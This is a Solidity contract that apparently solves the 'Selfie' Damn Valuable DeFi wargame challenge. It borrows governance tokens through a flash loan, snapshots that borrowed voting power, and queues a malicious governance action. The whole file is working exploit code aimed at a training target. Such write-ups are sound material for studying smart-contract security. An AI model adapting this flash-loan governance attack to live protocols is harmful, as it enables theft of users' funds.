// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import {Owned} from "solmate/auth/Owned.sol";

contract SelfieExploit is Owned {
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    SimpleGovernance public immutable simpleGovernance;
    SelfiePool public immutable selfiePool;
    DamnValuableTokenSnapshot public immutable dvtSnapshot;

    constructor(
        address _simpleGovernanceAddr,
        address _selfiePoolAddr,
        address _dvtSnapshotAddr
    ) Owned(msg.sender) {
        simpleGovernance = SimpleGovernance(_simpleGovernanceAddr);
        selfiePool = SelfiePool(_selfiePoolAddr);
        dvtSnapshot = DamnValuableTokenSnapshot(_dvtSnapshotAddr);
    }

    function receiveTokens(address _tokenAddress, uint256 _amount) external {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(
            _tokenAddress
        );
        token.snapshot();
        token.transfer(address(selfiePool), _amount);
    }

    function exploit(
        address _reciever,
        uint256 _flashLoanAmount,
        bytes calldata _data
    ) external onlyOwner returns (uint256 actionId) {
        selfiePool.flashLoan(_flashLoanAmount);
        actionId = simpleGovernance.queueAction(_reciever, _data, 0);
    }
}
